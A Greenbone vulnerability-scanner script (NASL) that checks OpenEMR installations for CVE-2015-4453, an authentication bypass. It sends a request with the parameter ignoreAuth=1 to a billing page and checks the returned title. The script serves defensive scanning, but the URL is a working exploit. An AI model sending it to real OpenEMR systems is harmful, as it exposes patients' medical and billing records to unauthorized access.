CPE = "cpe:/a:open-emr:openemr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105316" );
	script_bugtraq_id( 75299 );
	script_cve_id( "CVE-2015-4453" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2020-11-12T09:50:32+0000" );
	script_name( "OpenEMR 'interface/globals.php' Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/75299" );
	script_xref( name: "URL", value: "http://www.open-emr.org/" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to bypass the authentication
mechanism and perform unauthorized actions. This may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response" );
	script_tag( name: "insight", value: "A bug in OpenEMR's implementation of 'fake register_globals' in
interface/globals.php allows an attacker to bypass authentication by sending ignoreAuth=1 as a GET or
POST request parameter." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "OpenEMR is prone to an authentication-bypass vulnerability." );
	script_tag( name: "affected", value: "OpenEMR versions 2.8.3 through 4.2.0 patch 1 are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2020-11-12 09:50:32 +0000 (Thu, 12 Nov 2020)" );
	script_tag( name: "creation_date", value: "2015-07-08 13:23:01 +0200 (Wed, 08 Jul 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_openemr_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "openemr/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/interface/billing/sl_eob_search.php?ignoreAuth=1";
if(http_vuln_check( port: port, url: url, pattern: "<title>EOB Posting - Search" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

